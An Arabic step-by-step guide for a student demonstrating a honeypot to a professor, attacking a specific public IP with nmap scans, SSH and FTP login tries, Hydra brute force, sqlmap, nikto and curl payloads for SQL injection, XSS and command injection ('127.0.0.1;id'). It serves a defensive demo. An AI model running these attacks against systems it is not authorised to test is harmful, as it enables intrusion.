# خطوات التنفيذ على Ubuntu - بالتفصيل الممل 🎯

## الخطوة 1️⃣: افتح Terminal في Ubuntu

اضغط: `Ctrl + Alt + T`

أو من القائمة:  
**Applications** → **Terminal**

---

## الخطوة 2️⃣: ثبّت الأدوات (نفّذ سطر بسطر)

انسخ كل أمر والصقه ثم اضغط Enter:

```bash
sudo apt update
```
(سيطلب كلمة مرور Ubuntu - اكتبها ولن تظهر نقاط)

```bash
sudo apt install -y nmap
```

```bash
sudo apt install -y hydra
```

```bash
sudo apt install -y sqlmap
```

```bash
sudo apt install -y nikto
```

```bash
sudo apt install -y curl netcat-openbsd ftp telnet mysql-client
```

**تحقق من التثبيت:**
```bash
nmap --version
hydra -h | head -3
sqlmap --version
```

إذا ظهرت الإصدارات = تمام ✅

---

## الخطوة 3️⃣: اختبر الاتصال بالهدف

```bash
ping -c 4 13.53.131.159
```

**النتيجة المتوقعة:**
```
64 bytes from 13.53.131.159: icmp_seq=1 ttl=50 time=45.2 ms
64 bytes from 13.53.131.159: icmp_seq=2 ttl=50 time=44.8 ms
...
```

إذا ظهرت الردود = الاتصال شغال ✅  
إذا `100% packet loss` = مشكلة شبكة ❌

---

## الخطوة 4️⃣: افحص المنافذ

**فحص سريع (10 ثواني):**
```bash
nmap -Pn -p 2121,2222,2323,3307,8080,8501 13.53.131.159
```

**النتيجة:**
```
PORT     STATE SERVICE
2121/tcp open  ftp
2222/tcp open  ssh
2323/tcp open  telnet
3307/tcp open  mysql
8080/tcp open  http
8501/tcp open  unknown
```

**فحص مع الإصدارات (30 ثانية):**
```bash
nmap -sV -p 2121,2222,2323,3307,8080,8501 13.53.131.159
```

**النتيجة:**
```
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 8.0
8080/tcp open  http    Apache httpd 2.4.41
...
```

احفظ النتيجة:
```bash
nmap -sV -p 2121,2222,2323,3307,8080,8501 13.53.131.159 > nmap_scan.txt
cat nmap_scan.txt
```

---

## الخطوة 5️⃣: جرّب SSH (سيفشل - هذا متوقع)

```bash
ssh -p 2222 root@13.53.131.159
```

**النتيجة:**
```
root@13.53.131.159's password: 
```

اكتب أي شيء: `admin123` واضغط Enter

**سيقول:**
```
Permission denied, please try again.
```

اضغط `Ctrl+C` للخروج

**جرّب admin:**
```bash
ssh -p 2222 admin@13.53.131.159
```

نفس النتيجة - فشل متوقع ✅

---

## الخطوة 6️⃣: جرّب FTP Anonymous

```bash
ftp 13.53.131.159 2121
```

**عند الطلب:**
```
Name: anonymous
Password: anonymous
```

**إذا نجح:**
```
ftp> ls
ftp> quit
```

**إذا فشل:**
```
Login incorrect.
```
اكتب `quit` ثم Enter

---

## الخطوة 7️⃣: جرّب Telnet (شاهد Banner فقط)

```bash
telnet 13.53.131.159 2323
```

**سترى:**
```
Trying 13.53.131.159...
Connected to 13.53.131.159.
Escape character is '^]'.
Ubuntu 20.04 LTS
login: 
```

اضغط `Ctrl+]` ثم اكتب `quit`

---

## الخطوة 8️⃣: اختبر HTTP

**شاهد الصفحة الرئيسية:**
```bash
curl http://13.53.131.159:8080/
```

**شاهد Headers:**
```bash
curl -I http://13.53.131.159:8080/
```

**النتيجة:**
```
HTTP/1.1 200 OK
Server: Apache/2.4.41
...
```

---

## الخطوة 9️⃣: نفّذ هجمات HTTP بسيطة

**SQL Injection Test 1:**
```bash
curl "http://13.53.131.159:8080/login?user=admin'&pass=test"
```

**SQL Injection Test 2:**
```bash
curl "http://13.53.131.159:8080/login?user=admin'+OR+'1'='1&pass=x"
```

**XSS Test:**
```bash
curl "http://13.53.131.159:8080/search?q=<script>alert('XSS')</script>"
```

**Command Injection:**
```bash
curl "http://13.53.131.159:8080/ping?host=127.0.0.1;id"
```

كل أمر ينفّذ ويعطي رد (HTML عادة)

---

## الخطوة 🔟: افتح Dashboard لمراقبة الهجمات

**في Ubuntu - افتح Firefox:**
```bash
firefox http://13.53.131.159:8501 &
```

أو من Windows - افتح متصفح واكتب:
```
http://13.53.131.159:8501
```

**ستشاهد:**
- Total Attacks: رقم يزيد
- Recent Attacks: قائمة بالهجمات
- Attack Timeline: رسم بياني 24 ساعة

**كرر بعض الأوامر من الخطوة 9 وشاهد الأرقام تتغير!**

---

## الخطوة 1️⃣1️⃣: استخدم Hydra (محاولات محدودة)

**إنشاء ملف كلمات مرور بسيط:**
```bash
cat > passwords.txt << EOF
admin
123456
password
EOF
```

**تشغيل Hydra (3 محاولات فقط):**
```bash
hydra -l root -P passwords.txt ssh://13.53.131.159:2222 -t 3
```

**النتيجة (سيفشل):**
```
[2222][ssh] host: 13.53.131.159 login: root password: admin (FAILED)
[2222][ssh] host: 13.53.131.159 login: root password: 123456 (FAILED)
...
```

كل محاولة تسجّل كهجوم في Dashboard ✅

---

## الخطوة 1️⃣2️⃣: استخدم Nikto (فحص سريع)

```bash
nikto -h http://13.53.131.159:8080 -o nikto_report.txt
```

سيأخذ 1-2 دقيقة...

**بعد الانتهاء:**
```bash
cat nikto_report.txt
```

**ستجد:**
- Directory listings
- Server info
- Possible vulnerabilities

---

## الخطوة 1️⃣3️⃣: استخدم SQLMap (اختياري - خفيف)

```bash
sqlmap -u "http://13.53.131.159:8080/login?user=admin&pass=test" --batch --level=2 --risk=1
```

سيأخذ 2-3 دقائق...

**سيظهر:**
```
[*] testing 'AND boolean-based blind'
[*] testing 'MySQL >= 5.0 AND error-based'
...
```

**إذا وجد ثغرة:**
```
[!] Parameter 'user' is vulnerable
```

---

## الخطوة 1️⃣4️⃣: وثّق النتائج

**إنشاء مجلد للنتائج:**
```bash
mkdir ~/attack_demo
cd ~/attack_demo
```

**نسخ الملفات:**
```bash
cp ~/nmap_scan.txt .
cp ~/nikto_report.txt .
cp ~/passwords.txt .
```

**إنشاء ملف ملاحظات:**
```bash
nano notes.txt
```

**اكتب فيه:**
```
تاريخ: 23 نوفمبر 2025
الهدف: 13.53.131.159
المنافذ المفتوحة: 2121, 2222, 2323, 3307, 8080, 8501

النتائج:
- SSH: فشلت المحاولات (متوقع)
- FTP: anonymous نجح/فشل
- HTTP: استجاب لحقن SQL و XSS
- Dashboard: سجّل 15 هجوم

الخلاصة: النظام يرصد الهجمات بنجاح
```

احفظ: `Ctrl+O` ثم `Enter` ثم `Ctrl+X`

---

## الخطوة 1️⃣5️⃣: التحضير للعرض أمام الدكتور

**افتح نافذتين:**
1. Terminal (للأوامر)
2. Firefox/Chrome (Dashboard)

**السيناريو:**
1. اعرض nmap scan ونتائجه
2. جرّب SSH (فشل)
3. أرسل HTTP injection
4. **فوراً** غيّر للمتصفح واعرض Dashboard
5. **أرِ الدكتور** كيف العداد يزيد

**نصيحة:** جهّز الأوامر في ملف نصي للنسخ السريع!

---

## ملخص الأوامر الأساسية (للعرض السريع)

```bash
# 1. فحص
nmap -sV -p 2121,2222,2323,3307,8080 13.53.131.159

# 2. SSH
ssh -p 2222 root@13.53.131.159

# 3. HTTP حقن
curl "http://13.53.131.159:8080/login?user=admin'&pass=test"

# 4. Dashboard
firefox http://13.53.131.159:8501
```

---

## الأخطاء الشائعة وحلولها

**❌ `bash: nmap: command not found`**
```bash
sudo apt install -y nmap
```

**❌ `Connection refused`**
- تأكد من الـ IP صحيح
- تأكد من رقم المنفذ

**❌ Dashboard لا يعرض هجمات**
- انتظر 10-15 ثانية
- اضغط F5 لتحديث الصفحة
- كرر الهجوم مرة أخرى

**❌ `Permission denied (publickey)`**
- هذا عادي! SSH Honeypot يرفض كل المحاولات
- النقطة المهمة: تسجيل المحاولة

---

## ✅ تحقق من النجاح

- [ ] nmap أظهر المنافذ المفتوحة
- [ ] SSH رفض الدخول (متوقع)
- [ ] HTTP استجاب لطلبات curl
- [ ] Dashboard عرض إحصائيات
- [ ] وثّقت كل شيء في ملف

**إذا كل النقاط ✅ = جاهز للعرض أمام الدكتور!**

---

## 🎬 نصائح العرض النهائية

1. **ابدأ بشرح الهدف** (IP + الخدمات)
2. **أظهر nmap** مع شرح المنافذ
3. **جرّب هجوم واحد** ببطء وبصوت واضح
4. **انتقل للـ Dashboard فوراً**
5. **أرِ النتيجة** (الأرقام/الجداول)
6. **كرر** مع هجوم آخر للتأكيد

**لا تتعجل! الوضوح أهم من السرعة**

موفق! 🚀
